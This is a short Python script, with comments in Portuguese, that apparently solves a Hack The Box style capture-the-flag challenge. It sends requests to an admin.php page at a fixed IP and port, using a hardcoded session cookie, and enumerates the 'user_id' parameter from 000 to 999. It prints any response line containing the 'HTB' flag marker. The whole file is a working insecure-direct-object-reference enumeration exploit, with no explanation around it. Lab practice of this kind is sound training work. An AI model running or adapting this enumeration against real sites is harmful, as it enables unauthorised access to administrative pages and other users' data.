import requests

# Definir os cabeçalhos da requisição
headers = {
    'Host': '83.136.254.158:47570',
    'Cache-Control': 'max-age=0',
    'Accept-Language': 'pt-BR,pt;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cookie': 'PHPSESSID=avalq9kov4s9qg5iph5jikrpqo',
    'Connection': 'keep-alive'
}

# Base URL
url = "http://83.136.254.158:47570/admin.php"

# Função para fazer a requisição e filtrar a resposta
def enviar_requisicao(user_id):
    params = {'user_id': user_id}
    response = requests.get(url, headers=headers, params=params)

    # Verifica se a string 'HTB' está presente no conteúdo da resposta
    if "HTB" in response.text:
        print(f"String 'HTB' encontrada para user_id={user_id}!")
        # Imprimir a linha que contém 'HTB'
        for linha in response.text.splitlines():
            if "HTB" in linha:
                print(f"Linha com 'HTB': {linha}")
    else:
        print(f"String 'HTB' não encontrada para user_id={user_id}.")

# Loop de 000 a 999
for user_id in range(1000):
    user_id_str = str(user_id).zfill(3)  # Preenche com zeros à esquerda
    print(f"Enviando requisição para user_id={user_id_str}")
    enviar_requisicao(user_id_str)

